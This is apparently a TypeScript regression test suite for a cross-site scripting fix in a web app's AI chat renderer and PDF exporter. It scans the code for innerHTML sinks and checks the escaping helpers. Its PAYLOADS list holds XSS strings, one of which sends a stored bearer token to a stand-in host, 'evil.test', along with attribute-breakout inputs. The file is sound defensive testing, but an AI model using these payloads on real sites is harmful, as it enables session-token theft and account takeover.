/**
 * Markup injection — S-4, and the class it belongs to.
 *
 * The finding was in the AI chat transcript:
 *
 *     const html = line.replace(BOLD_PATTERN, (_, t) => '<strong>' + t + '</strong>');
 *     <p dangerouslySetInnerHTML={{ __html: html }} />
 *
 * Only the asterisks were transformed. Every other character in the message went
 * into `innerHTML` exactly as it arrived, so anything in a message that looked
 * like a tag was one.
 *
 * The reachable path needs no account. The diagnostic form is public; its
 * answers become context the assistant is asked about; the assistant quotes them
 * back; the quote renders in an operator's AUTHENTICATED console, where script
 * can read the bearer token out of storage. Public submitter to platform
 * operator, through one form field.
 *
 * Two kinds of test below. The first exercises the replacement renderer against
 * payloads directly. The second is a standing scan of the front-end for the sink
 * itself, because the defect is not that one line was wrong — it is that a
 * string was being built where a node belonged, and the next person to reach for
 * `dangerouslySetInnerHTML` will make the same trade.
 */

import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { readFile, readdir } from 'node:fs/promises';

const SRC = new URL('../../src/', import.meta.url);

/** Payloads that execute, or used to, when a string reaches `innerHTML`. */
const PAYLOADS = [
  '<img src=x onerror=alert(document.cookie)>',
  '<script>fetch("//evil.test/"+localStorage.getItem("token"))</script>',
  '<svg/onload=alert(1)>',
  '<iframe src="javascript:alert(1)">',
  '"><img src=x onerror=alert(1)>',
  "<a href='javascript:alert(1)'>click</a>",
  '<body onload=alert(1)>',
  '<style>@import"//evil.test"</style>',
  '**<img src=x onerror=alert(1)>**',
  '<img src=x onerror=alert(1)>**bold**',
];

/**
 * The renderer as GlobalAIChat defines it, read out of the component so the test
 * cannot drift from the implementation by quietly keeping its own copy — the
 * mistake that once left a cutover mutation uncaught.
 */
async function renderEmphasisSource(): Promise<string> {
  const source = await readFile(new URL('app/components/GlobalAIChat.tsx', SRC), 'utf8');
  const start = source.indexOf('function renderEmphasis(');
  assert.notEqual(start, -1, 'GlobalAIChat no longer defines renderEmphasis');
  // To the closing brace at column 0 — the function is top-level in the module.
  const end = source.indexOf('\n}', start);
  assert.notEqual(end, -1);
  return source.slice(start, end + 2);
}

describe('the chat renderer returns nodes, never markup', () => {
  it('produces no string containing a payload, for any payload', async () => {
    const body = await renderEmphasisSource();

    // Run it with a `strong` factory that records rather than renders, so the
    // real control flow is exercised without a DOM.
    const strongTexts: string[] = [];
    const React = { createElement: (_t: string, _p: unknown, child: string) => {
      strongTexts.push(child);
      return { __strong: child };
    } };
    const jsx = 'React.createElement("strong", null, match[1])';
    const executable = body
      .replace(/function renderEmphasis\(line: string\): React\.ReactNode\[\]/, 'function renderEmphasis(line)')
      .replace(/const nodes: React\.ReactNode\[\] = \[\]/, 'const nodes = []')
      .replace(/let match: RegExpExecArray \| null/, 'let match')
      .replace(/<strong key=\{`b\$\{match\.index\}`\}>\{match\[1\]\}<\/strong>/, jsx);

    const render = new Function('React', `${executable}; return renderEmphasis;`)(React) as (
      line: string,
    ) => unknown[];

    for (const payload of PAYLOADS) {
      strongTexts.length = 0;
      const nodes = render(payload);

      // Every plain segment is a STRING, handed to React as a text child.
      // React escapes those; markup in them is displayed, not parsed.
      for (const node of nodes) {
        if (typeof node === 'string') continue;
        assert.ok(
          node !== null && typeof node === 'object' && '__strong' in (node as object),
          `renderEmphasis emitted something that is neither text nor a <strong>: ${String(node)}`,
        );
      }

      // Nothing is ever concatenated into a markup string.
      const rejoined = nodes
        .map((n) => (typeof n === 'string' ? n : (n as { __strong: string }).__strong))
        .join('');
      assert.equal(
        rejoined,
        payload.replace(/\*\*/g, ''),
        'the payload was altered — the renderer is doing more than emphasis',
      );
      assert.ok(
        !nodes.some((n) => typeof n === 'string' && n.includes('<strong>')),
        'a tag was built as text',
      );
    }
  });

  it('still renders the emphasis it is there to render', async () => {
    const body = await renderEmphasisSource();
    const React = { createElement: (_t: string, _p: unknown, child: string) => ({ __strong: child }) };
    const render = new Function(
      'React',
      `${body
        .replace(/function renderEmphasis\(line: string\): React\.ReactNode\[\]/, 'function renderEmphasis(line)')
        .replace(/const nodes: React\.ReactNode\[\] = \[\]/, 'const nodes = []')
        .replace(/let match: RegExpExecArray \| null/, 'let match')
        .replace(
          /<strong key=\{`b\$\{match\.index\}`\}>\{match\[1\]\}<\/strong>/,
          'React.createElement("strong", null, match[1])',
        )}; return renderEmphasis;`,
    )(React) as (line: string) => unknown[];

    assert.deepEqual(render('plain text'), ['plain text']);
    assert.deepEqual(render('a **b** c'), ['a ', { __strong: 'b' }, ' c']);
    assert.deepEqual(render('**lead** and **tail**'), [
      { __strong: 'lead' },
      ' and ',
      { __strong: 'tail' },
    ]);
    assert.deepEqual(render(''), []);
  });
});

describe('the sink does not come back', () => {
  async function sources(dir: URL): Promise<URL[]> {
    const found: URL[] = [];
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      if (entry.name === 'node_modules') continue;
      const child = new URL(entry.name + (entry.isDirectory() ? '/' : ''), dir);
      if (entry.isDirectory()) found.push(...(await sources(child)));
      else if (/\.tsx?$/.test(entry.name)) found.push(child);
    }
    return found;
  }

  /**
   * `components/ui/` is shadcn's vendored primitives. `chart.tsx` writes a
   * `<style>` block from a closed set of theme tokens the application declares,
   * never from data. It is listed by name so that ADDING a sink there is still
   * a failure — a blanket directory exemption would have hidden one.
   */
  const ALLOWED = new Set(['app/components/ui/chart.tsx']);

  /**
   * Comments go before the scan runs. A module that EXPLAINS why it no longer
   * uses a sink mentions the sink by name, and the first version of this test
   * failed on exactly that — a scanner that cannot tell prose from code teaches
   * people to delete the prose.
   */
  function withoutComments(source: string): string {
    return source
      .replace(/\/\*[\s\S]*?\*\//g, ' ')
      .replace(/(^|[^:])\/\/[^\n]*/g, '$1');
  }

  it('no front-end module writes application data into innerHTML', async () => {
    const offenders: string[] = [];

    for (const file of await sources(SRC)) {
      const relative = file.pathname.slice(SRC.pathname.length);
      if (ALLOWED.has(relative)) continue;
      const source = withoutComments(await readFile(file, 'utf8'));

      if (/dangerouslySetInnerHTML/.test(source)) {
        offenders.push(`${relative}: dangerouslySetInnerHTML`);
      }
      // `main.tsx` writes boot fallbacks before React exists. They are allowed
      // to build HTML, but every interpolation in them must be escaped.
      const assignments = source.match(/\.(inner|outer)HTML\s*=\s*`[^`]*`/g) ?? [];
      for (const assignment of assignments) {
        const interpolations = assignment.match(/\$\{[^}]*\}/g) ?? [];
        for (const interpolation of interpolations) {
          if (!/escapeHtml\(|\besc\(/.test(interpolation)) {
            offenders.push(`${relative}: unescaped ${interpolation.slice(0, 48)}`);
          }
        }
      }
    }

    assert.deepEqual(offenders, [], 'these build markup from data instead of rendering nodes');
  });

  /**
   * Everything in `proposalExport.ts` that can neutralise a value: escaping it,
   * reducing it to a number, or mapping it through a closed table.
   */
  const NEUTRALISING = /\b(esc|annotateText|fmtDate|fmtDateShort|Number|safeColor|initials)\s*\(/;

  /** Remove each neutralising call together with its balanced argument list. */
  function stripNeutralised(expression: string): string {
    let out = '';
    let i = 0;
    for (;;) {
      const rest = expression.slice(i);
      const match = NEUTRALISING.exec(rest);
      if (!match) return out + rest;
      out += rest.slice(0, match.index);
      let j = match.index + match[0].length;
      let depth = 1;
      while (j < rest.length && depth > 0) {
        if (rest[j] === '(') depth++;
        else if (rest[j] === ')') depth--;
        j++;
      }
      i += j;
    }
  }

  /**
   * Drop the positions where a value is READ but never emitted: the test of a
   * ternary, and the receiver of a `.map`/`.filter`/`.join`/`.slice`. Without
   * this the check flags `${x.y ? <escaped> : ''}`, which is safe, and an
   * allowlist long enough to cover those stops being read by anyone.
   */
  function stripGuards(expression: string): string {
    let current = expression;
    let previous = '';
    while (previous !== current) {
      previous = current;
      // The test of a ternary. `?.` and `??` are stepped over rather than
      // rewritten: turning `a?.b` into `a .b` made an earlier version of this
      // read `<p style=` as a property access and flag every guarded branch.
      current = current.replace(/^(?:[^?]|\?[.?])*?\?(?![.?])/, '');
      current = current.replace(
        /\(?[A-Za-z_$][\w$]*(?:\??\.[\w$]+)*[^()]*?\)?\.(?:map|filter|join|slice)\(/,
        '(',
      );
    }
    return current;
  }

  it('the HTML the PDF exporter builds is escaped at every data interpolation', async () => {
    const source = withoutComments(
      await readFile(new URL('app/utils/proposalExport.ts', SRC), 'utf8'),
    );
    assert.match(source, /function esc\(/, 'the exporter lost its escaper');

    /**
     * The values this module emits WITHOUT neutralising them, each because it
     * cannot carry markup. Anything else that reaches the output raw is a
     * finding, including a field added tomorrow.
     *
     * The first version of this test used a denylist of field names instead, and
     * `rs.service_name` did not match its `.name` pattern — so deleting that
     * field's escaper changed nothing and the test stayed green. A denylist only
     * catches what somebody already thought of.
     */
    const JUSTIFIED = new Map<string, string>([
      ['${col.bg}', 'PRINT_COLORS — a closed table with a default'],
      ['${col.border}', 'PRINT_COLORS — a closed table with a default'],
      ['${col.text}', 'PRINT_COLORS — a closed table with a default'],
    ]);

    const unjustified: string[] = [];
    for (const expression of source.match(/\$\{[^{}]*(?:\{[^{}]*\}[^{}]*)*\}/g) ?? []) {
      const residue = stripGuards(stripNeutralised(expression));
      // A property access surviving both passes is a value being emitted raw.
      if (!/\b[A-Za-z_$][\w$]*\??\.(?!length\b)[a-z_]/.test(residue)) continue;
      const normalised = expression.replace(/\s+/g, ' ');
      if (JUSTIFIED.has(normalised)) continue;
      unjustified.push(normalised.slice(0, 80));
    }

    assert.deepEqual(
      unjustified,
      [],
      'these reach the exported HTML without passing through a neutralising helper',
    );
  });

  it('esc neutralises every character that can start markup', async () => {
    const source = await readFile(new URL('app/utils/proposalExport.ts', SRC), 'utf8');
    const start = source.indexOf('function esc(');
    assert.notEqual(start, -1, 'proposalExport lost esc');
    const body = source.slice(start, source.indexOf('\n}', start) + 2);

    // The real body again. The interpolation check above proves esc is CALLED
    // in every data position; on its own that is worth nothing, because an esc
    // that returns its argument is still called everywhere. This is the half
    // that says the call does something.
    const esc = new Function(
      `${body.replace(/function esc\(s: string\): string/, 'function esc(s)')}; return esc;`,
    )() as (value: string) => string;

    assert.equal(esc('<script>'), '&lt;script&gt;');
    assert.equal(esc('a & b'), 'a &amp; b');
    assert.equal(esc('say "hi"'), 'say &quot;hi&quot;');
    // Ampersand first, or the escapes escape each other into visible entities.
    assert.equal(esc('&lt;'), '&amp;lt;');

    for (const payload of PAYLOADS) {
      const escaped = esc(payload);
      assert.ok(!escaped.includes('<'), `esc left a < in ${payload.slice(0, 40)}`);
      assert.ok(!escaped.includes('>'), `esc left a > in ${payload.slice(0, 40)}`);
      assert.ok(!escaped.includes('"'), `esc left a " in ${payload.slice(0, 40)}`);
    }

    // Attribute values in this module are double-quoted throughout, so a bare
    // apostrophe cannot break out of one. That is a property of the template,
    // not of esc, so it is asserted where it holds.
    const html = withoutComments(source);
    assert.equal(
      (html.match(/=\s*'\$\{/g) ?? []).length,
      0,
      "an attribute is single-quoted, which esc's escape set does not cover",
    );
  });

  it('safeColor accepts a hex colour and nothing else', async () => {
    const source = await readFile(new URL('app/utils/proposalExport.ts', SRC), 'utf8');
    const start = source.indexOf('function safeColor(');
    assert.notEqual(start, -1, 'proposalExport lost safeColor');
    const body = source.slice(start, source.indexOf('\n}', start) + 2);

    // The real body, not a copy of it — asserting that the CALL is present says
    // nothing about what the call does, and a call whose guard was deleted still
    // reads as a call.
    const safeColor = new Function(
      `${body.replace(/function safeColor\(hex: string\): string/, 'function safeColor(hex)')}; return safeColor;`,
    )() as (hex: string) => string;

    assert.equal(safeColor('#FBBF24'), '#FBBF24');
    assert.equal(safeColor('#a78bfa'), '#a78bfa');

    for (const attack of [
      'red" onmouseover="alert(1)',
      '#fff;"><script>alert(1)</script>',
      'url(javascript:alert(1))',
      'expression(alert(1))',
      '#FBBF24 ',
      'rebeccapurple',
      '#FBBF2',
      '',
    ]) {
      assert.equal(
        safeColor(attack),
        '#FBBF24',
        `safeColor let ${JSON.stringify(attack)} through into a style attribute`,
      );
    }
  });
});
